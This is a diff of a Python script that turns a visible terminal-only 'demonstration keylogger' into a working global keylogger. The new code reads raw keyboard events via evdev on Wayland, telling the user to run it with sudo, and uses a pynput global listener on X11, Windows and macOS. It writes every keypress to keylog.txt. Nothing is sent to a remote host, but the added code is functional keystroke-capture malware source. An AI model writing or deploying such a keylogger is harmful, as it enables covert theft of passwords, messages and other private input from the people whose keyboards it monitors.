@@ -1,56 +1,102 @@
 import platform
 import os
+import sys
 from datetime import datetime
 
-log_file = "keylog.txt"
+LOG_FILE = "keylog.txt"
+WAYLAND_KEYBOARD_DEVICE = '/dev/input/event3'
 
-# Detect OS
-def detect_os():
-    return platform.system()
+def log_to_file(message):
+    """Writes a message to the log file."""
+    with open(LOG_FILE, "a") as f:
+        f.write(message)
 
-# Detect Display Server (Wayland / X11)
-def detect_display():
-    if os.environ.get("WAYLAND_DISPLAY"):
-        return "Wayland"
-    elif os.environ.get("DISPLAY"):
-        return "X11"
-    return "Unknown"
-
-# Log function
-def log_key(key):
-    with open(log_file, "a") as f:
-        f.write(key)
-
-def main():
-    os_name = detect_os()
-    display = detect_display()
-
-    print("="*50)
-    print(" Python Demonstration Keylogger ")
-    print("="*50)
-    print(f"OS Detected      : {os_name}")
-    print(f"Display Server   : {display}")
-
-    if os_name == "Linux" and display == "Wayland":
-        print("WARNING: Global keylogging is restricted by Wayland security.")
-        print("Running in DEMONSTRATION MODE (terminal capture).")
-
-    print("\nType anything. Press CTRL+C to stop.\n")
-
-    with open(log_file, "a") as f:
-        f.write(f"\n--- Logging started at {datetime.now()} ---\n")
-        f.write(f"OS: {os_name}, Display: {display}\n")
+def run_evdev_mode():
+    """Logic for Linux Wayland (Arch default) using evdev"""
+    print(f"[*] Mode: WAYLAND (Kernel Level). Trying to hook {WAYLAND_KEYBOARD_DEVICE}...")
 
     try:
-        while True:
-            key = input("> ")   # live visible demo
-            print(f"[LOGGED] {key}")
-            log_key(key + "\n")
-    except KeyboardInterrupt:
-        print("\nKeylogger stopped.")
-        with open(log_file, "a") as f:
-            f.write("--- Logging stopped ---\n")
+        import evdev
+    except ImportError:
+        print("\n[!] ERROR: 'evdev' library missing.")
+        print("    Run: sudo pacman -S python-evdev")
+        return
+
+    try:
+        device = evdev.InputDevice(WAYLAND_KEYBOARD_DEVICE)
+        print(f"[*] Success! Listening on: {device.name}")
+        print("[*] Press CTRL+C to stop.")
+
+        log_to_file(f"\n--- Started evdev logging on {device.name} at {datetime.now()} ---\n")
+
+        for event in device.read_loop():
+            if event.type == evdev.ecodes.EV_KEY:
+                data = evdev.categorize(event)
+                if data.keystate == 1:
+                    msg = f"{data.keycode}"
+                    print(msg)
+                    log_to_file(msg + "\n")
+
+    except FileNotFoundError:
+        print(f"\n[!] ERROR: Device '{WAYLAND_KEYBOARD_DEVICE}' not found.")
+        print("    Run 'sudo ls /dev/input/' to see available devices.")
+    except PermissionError:
+        print(f"\n[!] ERROR: Permission denied accessing {WAYLAND_KEYBOARD_DEVICE}.")
+        print("    YOU MUST RUN THIS SCRIPT WITH 'sudo' ON ARCH.")
+
+def run_pynput_mode():
+    """Logic for X11 / Windows / macOS using pynput"""
+    print("[*] Mode: STANDARD (X11/Windows). Hooking global input...")
+
+    try:
+        from pynput.keyboard import Key, Listener
+    except ImportError:
+        print("\n[!] ERROR: 'pynput' library missing.")
+        print("    Run: pip install pynput")
+        return
+
+    log_to_file(f"\n--- Started pynput logging at {datetime.now()} ---\n")
+
+    def on_press(key):
+        try:
+            k = key.char
+        except AttributeError:
+            k = str(key)
+
+        msg = f"{k}"
+        print(msg, flush=True)
+        log_to_file(msg + "\n")
+
+    def on_release(key):
+        if key == Key.esc:
+            print("\n[*] ESC pressed. Stopping...")
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+def main():
+    os_name = platform.system()
+
+    is_wayland = False
+    if os_name == "Linux":
+        if "WAYLAND_DISPLAY" in os.environ:
+            is_wayland = True
+        elif os.environ.get("XDG_SESSION_TYPE") == "wayland":
+            is_wayland = True
+
+    print("="*50)
+    print(f" OS Detected       : {os_name}")
+    print(f" Wayland Detected  : {is_wayland}")
+    print("="*50)
+
+    if os_name == "Linux" and is_wayland:
+        run_evdev_mode()
+    else:
+        run_pynput_mode()
 
 if __name__ == "__main__":
-    main()
-
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[*] Script terminated by user.")
